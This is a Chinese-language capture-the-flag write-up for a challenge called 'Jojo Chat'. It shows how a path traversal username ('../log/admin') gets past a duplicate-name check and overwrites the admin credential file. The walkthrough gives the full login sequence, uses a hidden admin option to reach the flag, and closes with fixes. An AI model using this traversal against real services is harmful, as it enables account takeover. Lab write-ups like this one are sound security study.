# Jojo Chat

## 题目简述

聊天服务把每个账号的密码哈希和消息保存在 `./log/<username>`。注册时，用户名未经路径规范化或目录边界检查就被拼入写入路径：

```python
log = open(f"./log/{name}", "w")
```

管理员身份并非单独的权限字段，而是登录用户名恰好等于 `admin`。因此，只要利用路径穿越覆盖既有的 `./log/admin`，就能把管理员密码改成攻击者已知值。

## 解题过程

注册逻辑只用 `os.listdir("./log")` 检查输入字符串是否与已有文件名完全相同：

```python
name = input("Enter your username: ")
names = os.listdir("./log")
while name in names:
    name = input("This username is already used! Enter another one: ")

passwd = input("Enter a password: ")
log = open(f"./log/{name}", "w")
log.write(f"Password : {hashlib.md5(passwd.encode()).hexdigest()}\n")
```

输入 `admin` 会因为重名被拒绝，但输入：

```text
../log/admin
```

不会出现在 `os.listdir("./log")` 返回的文件名列表中。实际拼接路径为：

```text
./log/../log/admin
```

操作系统规范化后，它仍指向 `./log/admin`。由于文件以 `w` 模式打开，原管理员日志会被截断，并写入攻击者选择的新密码哈希。

完整交互顺序为：

```text
1
Enter your username: ../log/admin
Enter a password: iamadmin

2
Username: admin
Password: iamadmin
```

登录成功后，主循环还提供一个未显示在菜单中的 `admin` 选项：

```python
match ...:
    case "admin":
        if name == "admin":
            admin()
```

输入：

```text
admin
```

即可进入管理员函数并得到：

```text
N0PS{pY7h0n_p4Th_7r4v3r54l}
```

## 方法总结

- 核心技巧：用 `../log/admin` 绕过文件名重名检查，同时让最终规范化路径覆盖管理员凭据文件。
- 识别信号：用户输入直接拼入文件路径、文件以覆盖模式打开、校验比较的是原始字符串而不是规范化后的真实路径。
- 复用要点：安全实现应拒绝路径分隔符，并在解析后确认目标路径仍位于预期根目录；更根本的做法是用服务端生成的不可控标识作为文件名。仅检查 `name in os.listdir(...)` 无法阻止路径别名。
